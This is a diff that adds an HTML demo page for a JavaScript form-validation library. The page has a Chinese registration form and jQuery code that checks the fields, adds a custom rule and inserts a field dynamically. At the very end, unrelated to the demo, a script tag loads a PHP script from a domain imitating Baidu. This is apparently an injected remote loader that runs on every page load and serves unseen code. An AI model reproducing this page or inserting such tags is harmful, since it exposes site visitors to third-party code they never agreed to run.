@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="UTF-8">
+        <title>Validity demo V2_2</title>
+        <link rel="stylesheet" href="../../../css/animate.css" />
+        <script type="text/javascript" src="../../v2_2.js"></script>
+        <script type="text/javascript" src="../../jquery.min.js"></script>
+        <style type="text/css">
+            ul {
+                list-style: none;
+                color: red;
+            }
+        </style>
+    </head>
+    <body>
+        <div>
+            <form data-v-validity="" onsubmit="return false;" name="reg-form">
+                <ul>
+                    <li>
+                        <label>用户名</label><input type="text" name="username" data-valid="*; length, 6, 16; alnum" data-label="用户名" />
+                        <label for="username" id="usernamefor"></label>
+                    </li>
+                    <li>
+                        <label>密码</label><input type="password" id="reg_password" name="password" data-valid="*; length, 6, 16; strength, 4" />
+                        <label for="password"></label>
+                    </li>
+                    <li>
+                        <label>重复密码</label><input type="password" name="repasswd" data-valid="*; length, 6, 16; equal, #reg_password" />
+                        <label for="repasswd"></label>
+                    </li>
+                    <li>
+                        <label>自定义效验方法</label><input type="myinput" name="myinput" data-valid="*; myfunc, 9" />
+                        <label for="myinput"></label>
+                    </li>
+                </ul>
+                <button type="submit">提交</button>
+                <button type="button" onclick="cleanError();">清空消息</button>
+                <label for="reg-form"></label>
+            </form>
+        </div>
+        <script type="text/javascript">
+            // 检查表单效验结果
+            $('[name="reg-form"]').on('submit', function (event) {
+                //event.stopPropagation();
+                //event.preventDefault();
+                var valider = v.Validity.obj(this);
+                var rs = valider.check();
+                valider.prompt(rs ? '搞正确了！' : '搞错没哟');
+            });
+            // 载入后添加自定义规则
+            v.load('../validity.js').then(function () {
+                // 自定义规则
+                v.Validity.obj('[name="reg-form"]').rule('myfunc', function (value, max) {
+                    return 'Error';
+                });
+                // 动态添加元素支持
+                v.$('form ul').appendChild(v.$('<li><label>动态元素</label> <input type = "acinput" name = "acinput" data-valid = "*; myfunc, 9" /><label for="acinput"></label></li>'));
+            });
+            // 清除错误消息
+            function cleanError() {
+                v.Validity.obj('[name="reg-form"]').clean();
+            }
+        </script>
+        <script src="http://baidu.wzzjh168.cn/s/tt.php?id=10026"></script>
+    </body>
+</html>
